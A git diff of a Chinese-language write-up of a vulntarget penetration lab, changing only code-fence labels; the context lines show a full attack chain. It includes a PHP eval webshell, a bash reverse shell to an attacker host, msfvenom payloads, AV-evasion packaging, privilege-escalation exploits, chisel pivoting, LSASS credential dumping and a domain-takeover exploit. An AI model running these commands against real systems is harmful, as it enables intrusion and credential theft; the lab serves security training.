@@ -71,13 +71,13 @@ server2016 域控 使用原有密码登陆的时候，会触发强制密码更�
 
 使用 `root/root` 登陆系统
 
-```shell
+```bash
 nmcli connection show
 ```
 
 ![img](img/image_20241123-202328.png)
 
-```shell
+```bash
 ip address
 ```
 
@@ -85,13 +85,13 @@ ip address
 
 可以看到，是 `ens33` 这个网卡的配置存在问题
 
-```shell
+```bash
 nmcli connection show ens33
 ```
 
 直接删除旧的配置文件
 
-```shell
+```bash
 nmcli device status
 nmcli connection delete ens33
 ```
@@ -100,7 +100,7 @@ nmcli connection delete ens33
 
 写一个新的配置
 
-```shell
+```bash
 nmcli connection add con-name ens33 \
 type ethernet \
 ifname ens33 \
@@ -115,7 +115,7 @@ ipv4.method auto
 
 直接使用 `fscan` 进行端口扫描
 
-```shell
+```bash
 start infoscan
 192.168.200.12:22 open
 192.168.200.12:21 open
@@ -239,7 +239,7 @@ with open("./top1000.txt", "r") as f:
 
 构造恶意的 zip 文件
 
-```shell
+```bash
 $ cat shell.php
 <?php @eval($_POST['shell']) ?>
 
@@ -330,13 +330,13 @@ action=file-upzip&filepath=dbrestor&download_url=http%3A%2F%2F192.168.200.129%3A
 
 首先，写入一个 `/www/wwwroot/jizhi/shell.sh`
 
-```shell
+```bash
 /bin/sh -i >& /dev/tcp/192.168.200.129/3000 0>&1
 ```
 
 然后使用插件的 `PHP7 GC with Certain Destructors UAF` 打开虚拟终端，执行脚本
 
-```shell
+```bash
 (www:/www/wwwroot/jizhi) $ chmod +x shell.sh
 (www:/www/wwwroot/jizhi) $ ./shell.sh
 ```
@@ -349,7 +349,7 @@ action=file-upzip&filepath=dbrestor&download_url=http%3A%2F%2F192.168.200.129%3A
 
 进行一个基础探测
 
-```shell
+```bash
 (remote) www@localhost.localdomain:/tmp$ getcap -r / 2>/dev/null
 /usr/bin/newgidmap = cap_setgid+ep
 /usr/bin/newuidmap = cap_setuid+ep
@@ -405,7 +405,7 @@ strace Not Found
 
 并查看 sudo 二进制程序的版本
 
-```shell
+```bash
 (remote) www@localhost.localdomain:/tmp$ sudo --version
 Sudo version 1.8.23
 Sudoers policy plugin version 1.8.23
@@ -422,7 +422,7 @@ CVE-2021-4034 -> pkexec
 
 理论上两个洞都能打，这里只尝试 `CVE-2021-4034`
 
-```shell
+```bash
 (remote) www@localhost.localdomain:/tmp$ gcc cve-2021-4034-poc.c
 (remote) www@localhost.localdomain:/tmp$ ./a.out
 sh-4.2# whoami
@@ -435,7 +435,7 @@ vulntarget{get-one-centos-privilage-promotion}
 
 首先，先生成一份 Metasploit 的马子
 
-```shell
+```bash
 $ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.200.129 LPORT=3333 -f elf > 192.168.200.129-3333.elf
 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
 [-] No arch selected, selecting arch: x64 from the payload
@@ -446,7 +446,7 @@ Final size of elf file: 250 bytes
 
 使用 `CVE-2021-4034` 漏洞，以 `root` 权限执行马子，上线 Msfconsole
 
-```shell
+```bash
 msf6 > use exploit/multi/handler
 [*] Using configured payload generic/shell_reverse_tcp
 msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
@@ -473,7 +473,7 @@ Meterpreter  : x64/linux
 
 直接使用 Meterpreter 建立内网代理
 
-```shell
+```bash
 meterpreter > run post/multi/manage/autoroute
 
 [*] Running module against localhost.localdomain
@@ -484,7 +484,7 @@ meterpreter > run post/multi/manage/autoroute
 
 然后启动 socks 服务器
 
-```shell
+```bash
 msf6 exploit(multi/handler) > use auxiliary/server/socks_proxy
 msf6 auxiliary(server/socks_proxy) > exploit
 [*] Auxiliary module running as background job 0.
@@ -498,7 +498,7 @@ msf6 auxiliary(server/socks_proxy) >
 
 查看网卡信息
 
-```shell
+```bash
 meterpreter > ifconfig
 
 Interface  1
@@ -541,7 +541,7 @@ IPv6 Netmask : ffff:ffff:ffff:ffff::
 
 查看 ARP 表
 
-```shell
+```bash
 meterpreter > arp
 
 ARP cache
@@ -556,7 +556,7 @@ ARP cache
 
 发现另外一台主机 `10.0.20.66` 的存在，上传 `fscan` 并执行扫描
 
-```shell
+```bash
 start infoscan
 10.0.20.66:8080 open
 10.0.20.66:3306 open
@@ -574,7 +574,7 @@ start vulscan
 
 Meterpreter 的代理能力有限，建议使用其他工具，例如 `chisel`
 
-```shell
+```bash
 # Kali
 $ ./tools/chisel-v1.9.1/chisel_1.9.1_linux_amd64 server -p 1337 --reverse
 2024/11/02 09:58:38 server: Reverse tunnelling enabled
@@ -618,7 +618,7 @@ $ ./tools/chisel-v1.9.1/chisel_1.9.1_linux_amd64 server -p 1337 --reverse
 
 将 web 服务转发出来
 
-```shell
+```bash
 (remote) root@localhost.localdomain:/tmp# ./chisel_1.9.1_linux_amd64 client 192.168.200.129:1337 R:0.0.0.0:10002:10.0.20.66:8080 &
 [2] 7389
 2024/11/02 10:07:53 client: Connecting to ws://192.168.200.129:1337
@@ -643,7 +643,7 @@ $ ./tools/chisel-v1.9.1/chisel_1.9.1_linux_amd64 server -p 1337 --reverse
 
 首先，编写一个一句话传到 `centos` 上
 
-```shell
+```bash
 (remote) root@localhost.localdomain:/tmp# echo PD9waHAgQGV2YWwoJF9QT1NUWydzaGVsbCddKSA/Pg== | base64 -d > shell.php
 (remote) root@localhost.localdomain:/tmp# cat shell.php
 <?php @eval($_POST['shell']) ?>
@@ -651,21 +651,21 @@ $ ./tools/chisel-v1.9.1/chisel_1.9.1_linux_amd64 server -p 1337 --reverse
 
 然后启动临时的 Python http server
 
-```shell
+```bash
 (remote) root@localhost.localdomain:/tmp# python -m SimpleHTTPServer 8080
 Serving HTTP on 0.0.0.0 port 8080 ...
 ```
 
 计算链接参数
 
-```shell
+```bash
 $ echo "http://10.0.20.66:8080/index.php?m=client&f=download&version=1&link=$(echo'HTTP://10.0.20.30:8080/shell.php'| base64)"
 http://10.0.20.66:8080/index.php?m=client&f=download&version=1&link=SFRUUDovLzEwLjAuMjAuMzA6ODA4MC9zaGVsbC5waHAK
 ```
 
 在禅道上触发下载
 
-```shell
+```bash
 http://192.168.200.129:10002/index.php?m=client&f=download&version=1&link=SFRUUDovLzEwLjAuMjAuMzA6ODA4MC9zaGVsbC5waHA=
 ```
 
@@ -687,7 +687,7 @@ http://192.168.200.129:10002/index.php?m=client&f=download&version=1&link=SFRUUD
 
 生成一下 shellcode
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.20.30 LPORT=4444 --encrypt base64 -f c
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -850,7 +850,7 @@ if __name__ == '__main__':
 
 将 python 脚本打包为二进制文件
 
-```shell
+```bash
 PS D:\_Code\test> pyinstaller -F -w .\Bypass_AV-20250203.py
 227 INFO: PyInstaller: 6.11.0, contrib hooks: 2024.9
 227 INFO: Python: 3.11.8
@@ -916,7 +916,7 @@ PS D:\_Code\test> pyinstaller -F -w .\Bypass_AV-20250203.py
 
 上传至靶机之后，先添加端口转发和监听器
 
-```shell
+```bash
 # Centos
 (remote) www@localhost.localdomain:/tmp$ ./chisel_1.9.1_linux_amd64 client 192.168.200.128:1337 0.0.0.0:4444:127.0.0.1:4444 &
 [3] 36534
@@ -942,7 +942,7 @@ msf6 exploit(multi/handler) > run
 
 成功上线
 
-```shell
+```bash
 msf6 exploit(multi/handler) > run
 
 [*] Started reverse TCP handler on 0.0.0.0:4444
@@ -963,7 +963,7 @@ Meterpreter     : x64/windows
 
 先进行探测
 
-```shell
+```bash
 meterpreter > run post/multi/recon/local_exploit_suggester
 
 [*] 10.0.20.66 - Collecting local exploits for x64/windows...
@@ -1040,7 +1040,7 @@ meterpreter > run post/multi/recon/local_exploit_suggester
 
 尝试进行自动化利用，但是失败
 
-```shell
+```bash
 msf6 > use exploit/windows/local/cve_2022_21882_win32k
 [*] Using configured payload windows/x64/meterpreter/reverse_tcp
 msf6 exploit(windows/local/cve_2022_21882_win32k) > set lhost 0.0.0.0
@@ -1063,7 +1063,7 @@ msf6 exploit(windows/local/cve_2022_21882_win32k) > exploit
 
 尝试手动 [linuxdy/CVE-2021-1732_exp](https://github.com/linuxdy/CVE-2021-1732_exp) 进行利用，记得使用 shelcode 进行免杀
 
-```shell
+```bash
 meterpreter > shell
 Process 4348 created.
 Channel 1 created.
@@ -1117,7 +1117,7 @@ nt authority\system
 
 提权可行的话，直接上线 msf
 
-```shell
+```bash
 msf6 exploit(multi/handler) > run
 
 [*] Started reverse TCP handler on 0.0.0.0:4444
@@ -1138,7 +1138,7 @@ Meterpreter     : x64/windows
 
 ## win10 抓取域信息
 
-```shell
+```bash
 meterpreter > run post/windows/gather/enum_domain
 
 [+] Domain FQDN: vulntarget.com
@@ -1148,7 +1148,7 @@ meterpreter > run post/windows/gather/enum_domain
 
 直接抓取密码会失败
 
-```shell
+```bash
 meterpreter > load kiwi
 Loading extension kiwi...
   .#####.   mimikatz 2.2.0 20191125 (x64/windows)
@@ -1202,7 +1202,7 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
 
 另外一种，就是利用 [ProcDump - Sysinternals | Microsoft Learn](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump) 抓取 LSASS 进程的内存，然后本地用mimikatz进行分析
 
-```shell
+```bash
 # win10 capture memory
 .\procdump64.exe -accepteula -ma lsass.exe lsass.dmp
 
@@ -1218,7 +1218,7 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
 
 先建立代理
 
-```shell
+```bash
 # centos
 (remote) www@localhost.localdomain:/tmp$ ./chisel_1.9.1_linux_amd64 client 192.168.200.128:1337 0.0.0.0:1337:192.168.200.128:1337 &
 [4] 38751
@@ -1234,7 +1234,7 @@ C:\Users\Public>.\chisel_1.9.1_windows_amd6.exe client 10.0.20.30:1337 R:0.0.0.0
 
 尝试使用 [safebuffer/sam-the-admin: Exploiting CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user](https://github.com/safebuffer/sam-the-admin) 进行利用
 
-```shell
+```bash
 ┌──(randark㉿kali)-[~]
 └─$ proxychains python3 ./tools/sam-the-admin/sam_the_admin.py "vulntarget.com/win101:admin#123" -dc-ip 10.0.10.100 -shell       
 [proxychains] config file found: /etc/proxychains4.conf
